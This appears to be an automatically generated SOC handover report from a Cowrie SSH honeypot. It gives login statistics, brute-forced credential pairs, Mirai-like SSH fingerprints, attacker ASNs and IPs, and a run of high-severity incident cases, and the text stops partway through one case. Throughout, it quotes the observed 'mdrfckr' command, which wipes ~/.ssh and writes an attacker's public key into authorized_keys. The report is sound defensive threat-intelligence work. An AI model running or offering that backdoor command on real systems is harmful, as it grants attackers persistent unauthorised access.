# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-12 |
| **Generated At** | 2026-06-12T23:21:34Z |
| **Shift Time** | 23:21 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **126** |
| Confirmed Threats | **122** |
| False Positives Filtered | **4** (3.2%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **14** |
| High Severity Cases | **36** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **90** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **115** |
| Unique Credential Pairs | **81** |
| Unique Usernames | **63** |
| Unique Passwords | **70** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 36 |
| `345gs5662d34` | 18 |
| `piyush` | 1 |
| `andy` | 1 |
| `sgp` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `123456` | 11 |
| `1234` | 2 |
| `Qaz123321` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 18 |
| `piyush` | `123456` | 1 |
| `root` | `Qaz123321` | 1 |
| `root` | `Qwerty123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qaz123321` | `14.248.83.33` | 2026-06-12T21:51:39 |
| `root` | `3245gs5662d34` | `14.248.83.33` | 2026-06-12T21:51:43 |
| `root` | `Qwerty123` | `152.32.239.90` | 2026-06-12T21:51:48 |
| `root` | `3245gs5662d34` | `152.32.239.90` | 2026-06-12T21:51:51 |
| `root` | `bigred` | `104.244.74.84` | 2026-06-12T21:55:21 |
| `root` | `3245gs5662d34` | `104.244.74.84` | 2026-06-12T21:55:27 |
| `root` | `000000000` | `14.248.83.33` | 2026-06-12T21:56:14 |
| `root` | `1qaz!2wsx@` | `14.248.83.33` | 2026-06-12T21:58:34 |
| `root` | `agent` | `60.251.50.148` | 2026-06-12T22:02:42 |
| `root` | `3245gs5662d34` | `60.251.50.148` | 2026-06-12T22:02:45 |
| `root` | `potato123` | `104.244.74.84` | 2026-06-12T22:02:56 |
| `root` | `ym123456` | `139.84.243.79` | 2026-06-12T22:05:10 |
| `root` | `3245gs5662d34` | `139.84.243.79` | 2026-06-12T22:05:17 |
| `root` | `Digitalocean123!` | `139.84.243.79` | 2026-06-12T22:07:20 |
| `root` | `Abc123abc` | `104.244.74.84` | 2026-06-12T22:12:43 |
| `root` | `QWEqwe!@#123` | `104.244.74.84` | 2026-06-12T22:14:37 |
| `root` | `Password!` | `104.244.74.84` | 2026-06-12T22:16:35 |
| `root` | `asd@123123` | `104.244.74.84` | 2026-06-12T22:18:29 |
| `root` | `P@$$W0rd` | `104.244.74.84` | 2026-06-12T22:24:24 |
| `root` | `Test123!@#` | `43.164.190.64` | 2026-06-12T22:28:12 |
| `root` | `3245gs5662d34` | `43.164.190.64` | 2026-06-12T22:28:15 |
| `root` | `zzidc2024` | `104.244.74.84` | 2026-06-12T22:30:12 |
| `root` | `QWER123456@` | `14.29.227.118` | 2026-06-12T22:40:06 |
| `root` | `3245gs5662d34` | `14.29.227.118` | 2026-06-12T22:40:10 |
| `root` | `2050` | `177.60.125.141` | 2026-06-12T23:18:37 |
| `root` | `3245gs5662d34` | `177.60.125.141` | 2026-06-12T23:18:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **126** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 114 |
| OpenSSH | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 113 | 13 |
| `acaa53e0a7d7...` | Mirai/variant | 2 | 2 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 113 | 13 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 2 | 2 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 8 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `60.251.50.148`, `43.164.190.64`, `14.29.227.118`, `152.32.239.90`, `14.248.83.33`, `177.60.125.141`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **24** |
| High-Risk ASNs | **19** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 2 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 1 | MEDIUM |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS20473` | The Constant Company, LLC | 1 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 1 | HIGH |
| `AS26599` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS41745` | Baykov Ilya Sergeevich | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (36)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-6a1248957fed

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:51 |
| **Last Seen** | 2026-06-12 21:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:51:38` | `cowrie.session.connect` |
| `2026-06-12 21:51:38` | `cowrie.client.version` |
| `2026-06-12 21:51:38` | `cowrie.client.kex` |
| `2026-06-12 21:51:39` | `cowrie.login.success` |
| `2026-06-12 21:51:39` | `cowrie.session.params` |
| `2026-06-12 21:51:39` | `cowrie.command.input` |
| `2026-06-12 21:51:39` | `cowrie.command.failed` |
| `2026-06-12 21:51:39` | `cowrie.log.closed` |
| `2026-06-12 21:51:40` | `cowrie.session.params` |
| `2026-06-12 21:51:40` | `cowrie.command.input` |
| `2026-06-12 21:51:40` | `cowrie.session.file_download` |
| `2026-06-12 21:51:40` | `cowrie.log.closed` |
| `2026-06-12 21:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e174daea748

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:51 |
| **Last Seen** | 2026-06-12 21:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:51:43` | `cowrie.session.connect` |
| `2026-06-12 21:51:43` | `cowrie.client.version` |
| `2026-06-12 21:51:43` | `cowrie.client.kex` |
| `2026-06-12 21:51:43` | `cowrie.login.success` |
| `2026-06-12 21:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c712d84c0e8

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]90` |
| **First Seen** | 2026-06-12 21:51 |
| **Last Seen** | 2026-06-12 21:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:51:48` | `cowrie.session.connect` |
| `2026-06-12 21:51:48` | `cowrie.client.version` |
| `2026-06-12 21:51:48` | `cowrie.client.kex` |
| `2026-06-12 21:51:48` | `cowrie.login.success` |
| `2026-06-12 21:51:48` | `cowrie.session.params` |
| `2026-06-12 21:51:48` | `cowrie.command.input` |
| `2026-06-12 21:51:48` | `cowrie.command.failed` |
| `2026-06-12 21:51:49` | `cowrie.log.closed` |
| `2026-06-12 21:51:49` | `cowrie.session.params` |
| `2026-06-12 21:51:49` | `cowrie.command.input` |
| `2026-06-12 21:51:49` | `cowrie.session.file_download` |
| `2026-06-12 21:51:49` | `cowrie.log.closed` |
| `2026-06-12 21:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]90` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]90` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ca4b0ccd53c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.239[.]90` |
| **First Seen** | 2026-06-12 21:51 |
| **Last Seen** | 2026-06-12 21:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:51:51` | `cowrie.session.connect` |
| `2026-06-12 21:51:51` | `cowrie.client.version` |
| `2026-06-12 21:51:51` | `cowrie.client.kex` |
| `2026-06-12 21:51:51` | `cowrie.login.success` |
| `2026-06-12 21:51:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.239[.]90` to AbuseIPDB if not already reported
- [ ] Block `152.32.239[.]90` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ed876548ea6

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 21:55 |
| **Last Seen** | 2026-06-12 21:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:55:20` | `cowrie.session.connect` |
| `2026-06-12 21:55:20` | `cowrie.client.version` |
| `2026-06-12 21:55:20` | `cowrie.client.kex` |
| `2026-06-12 21:55:21` | `cowrie.login.success` |
| `2026-06-12 21:55:22` | `cowrie.session.params` |
| `2026-06-12 21:55:22` | `cowrie.command.input` |
| `2026-06-12 21:55:22` | `cowrie.command.failed` |
| `2026-06-12 21:55:22` | `cowrie.log.closed` |
| `2026-06-12 21:55:23` | `cowrie.session.params` |
| `2026-06-12 21:55:23` | `cowrie.command.input` |
| `2026-06-12 21:55:23` | `cowrie.session.file_download` |
| `2026-06-12 21:55:23` | `cowrie.log.closed` |
| `2026-06-12 21:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ec88459758

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 21:55 |
| **Last Seen** | 2026-06-12 21:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:55:26` | `cowrie.session.connect` |
| `2026-06-12 21:55:26` | `cowrie.client.version` |
| `2026-06-12 21:55:26` | `cowrie.client.kex` |
| `2026-06-12 21:55:27` | `cowrie.login.success` |
| `2026-06-12 21:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90f0eb0cc0b3

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:56 |
| **Last Seen** | 2026-06-12 21:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:56:14` | `cowrie.session.connect` |
| `2026-06-12 21:56:14` | `cowrie.client.version` |
| `2026-06-12 21:56:14` | `cowrie.client.kex` |
| `2026-06-12 21:56:14` | `cowrie.login.success` |
| `2026-06-12 21:56:14` | `cowrie.session.params` |
| `2026-06-12 21:56:14` | `cowrie.command.input` |
| `2026-06-12 21:56:14` | `cowrie.command.failed` |
| `2026-06-12 21:56:15` | `cowrie.log.closed` |
| `2026-06-12 21:56:15` | `cowrie.session.params` |
| `2026-06-12 21:56:15` | `cowrie.command.input` |
| `2026-06-12 21:56:15` | `cowrie.session.file_download` |
| `2026-06-12 21:56:15` | `cowrie.log.closed` |
| `2026-06-12 21:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40da47433faf

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:56 |
| **Last Seen** | 2026-06-12 21:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:56:17` | `cowrie.session.connect` |
| `2026-06-12 21:56:17` | `cowrie.client.version` |
| `2026-06-12 21:56:17` | `cowrie.client.kex` |
| `2026-06-12 21:56:18` | `cowrie.login.success` |
| `2026-06-12 21:56:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb5989effa9c

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:58 |
| **Last Seen** | 2026-06-12 21:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:58:33` | `cowrie.session.connect` |
| `2026-06-12 21:58:33` | `cowrie.client.version` |
| `2026-06-12 21:58:33` | `cowrie.client.kex` |
| `2026-06-12 21:58:34` | `cowrie.login.success` |
| `2026-06-12 21:58:34` | `cowrie.session.params` |
| `2026-06-12 21:58:34` | `cowrie.command.input` |
| `2026-06-12 21:58:34` | `cowrie.command.failed` |
| `2026-06-12 21:58:34` | `cowrie.log.closed` |
| `2026-06-12 21:58:35` | `cowrie.session.params` |
| `2026-06-12 21:58:35` | `cowrie.command.input` |
| `2026-06-12 21:58:35` | `cowrie.session.file_download` |
| `2026-06-12 21:58:35` | `cowrie.log.closed` |
| `2026-06-12 21:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c6018c9b874

| Field | Detail |
|---|---|
| **Source IP** | `14.248.83[.]33` |
| **First Seen** | 2026-06-12 21:58 |
| **Last Seen** | 2026-06-12 21:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 21:58:37` | `cowrie.session.connect` |
| `2026-06-12 21:58:37` | `cowrie.client.version` |
| `2026-06-12 21:58:37` | `cowrie.client.kex` |
| `2026-06-12 21:58:37` | `cowrie.login.success` |
| `2026-06-12 21:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.83[.]33` to AbuseIPDB if not already reported
- [ ] Block `14.248.83[.]33` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97e1b9e0d70

| Field | Detail |
|---|---|
| **Source IP** | `60.251.50[.]148` |
| **First Seen** | 2026-06-12 22:02 |
| **Last Seen** | 2026-06-12 22:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:02:41` | `cowrie.session.connect` |
| `2026-06-12 22:02:41` | `cowrie.client.version` |
| `2026-06-12 22:02:41` | `cowrie.client.kex` |
| `2026-06-12 22:02:42` | `cowrie.login.success` |
| `2026-06-12 22:02:42` | `cowrie.session.params` |
| `2026-06-12 22:02:42` | `cowrie.command.input` |
| `2026-06-12 22:02:42` | `cowrie.command.failed` |
| `2026-06-12 22:02:42` | `cowrie.log.closed` |
| `2026-06-12 22:02:42` | `cowrie.session.params` |
| `2026-06-12 22:02:42` | `cowrie.command.input` |
| `2026-06-12 22:02:42` | `cowrie.session.file_download` |
| `2026-06-12 22:02:42` | `cowrie.log.closed` |
| `2026-06-12 22:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.50[.]148` to AbuseIPDB if not already reported
- [ ] Block `60.251.50[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc10f9890791

| Field | Detail |
|---|---|
| **Source IP** | `60.251.50[.]148` |
| **First Seen** | 2026-06-12 22:02 |
| **Last Seen** | 2026-06-12 22:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:02:44` | `cowrie.session.connect` |
| `2026-06-12 22:02:44` | `cowrie.client.version` |
| `2026-06-12 22:02:45` | `cowrie.client.kex` |
| `2026-06-12 22:02:45` | `cowrie.login.success` |
| `2026-06-12 22:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.251.50[.]148` to AbuseIPDB if not already reported
- [ ] Block `60.251.50[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccf49f8e8633

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:02 |
| **Last Seen** | 2026-06-12 22:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
